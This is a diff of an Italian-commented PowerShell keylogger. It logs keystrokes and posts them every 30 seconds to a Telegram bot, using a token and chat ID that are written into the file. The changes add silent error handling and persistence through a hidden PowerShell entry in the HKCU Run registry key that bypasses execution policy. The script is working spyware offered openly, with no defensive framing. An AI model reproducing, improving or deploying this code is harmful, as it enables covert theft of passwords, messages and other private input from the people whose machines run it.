@@ -1,6 +1,6 @@
 # Configurazione Telegram
-$botToken = "7636235608:AAFheAZoLU3edoN2_0IRzgmfMOrWST7pilQ"  # Inserisci qui il token del bot
-$chatId = "6550700163"  # Inserisci qui il Chat ID
+$botToken = "7636235608:AAFheAZoLU3edoN2_0IRzgmfMOrWST7pilQ"  # Token del bot
+$chatId = "6550700163"  # Chat ID
 $apiURL = "https://api.telegram.org/bot$botToken/sendMessage"
 
 # Percorso del file temporaneo per salvare i log
@@ -36,10 +36,15 @@ public class KeyboardTracker {
 "@
 
     while ($true) {
-        Start-Sleep -Milliseconds 50
-        $keys = [KeyboardTracker]::LogKeys()
-        if ($keys -ne "") {
-            Add-Content -Path $tempFile -Value $keys
+        Start-Sleep -Milliseconds 100  # Intervallo per ridurre l'uso della CPU
+        try {
+            $keys = [KeyboardTracker]::LogKeys()
+            if ($keys -ne "") {
+                Add-Content -Path $tempFile -Value $keys
+            }
+        } catch {
+            # Gestione errori silenziosa
+            Start-Sleep -Seconds 5
         }
     }
 }
@@ -48,20 +53,29 @@ public class KeyboardTracker {
 function Send-Logs {
     while ($true) {
         Start-Sleep -Seconds 30
-        if (Test-Path $tempFile) {
-            $logs = Get-Content -Path $tempFile -Raw
-            $body = @{
-                chat_id = $chatId
-                text = $logs
+        try {
+            if (Test-Path $tempFile) {
+                $logs = Get-Content -Path $tempFile -Raw
+                $body = @{
+                    chat_id = $chatId
+                    text = $logs
+                }
+                $response = Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
+                if ($response.StatusCode -eq 200) {
+                    Clear-Content -Path $tempFile
+                }
             }
-            try {
-                Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
-                Clear-Content -Path $tempFile
-            } catch {
-                Write-Host "Errore durante l'invio a Telegram"
-            }
+        } catch {
+            # Gestione errori
+            Write-Host "Errore durante l'invio a Telegram: $_"
+            Start-Sleep -Seconds 10
         }
     }
+}
+
+# Persistenza: aggiungi il keylogger al registro di avvio
+if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogger")) {
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keylogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath" | Out-Null
 }
 
 # Avvia il keylogger e l'invio dei log in background
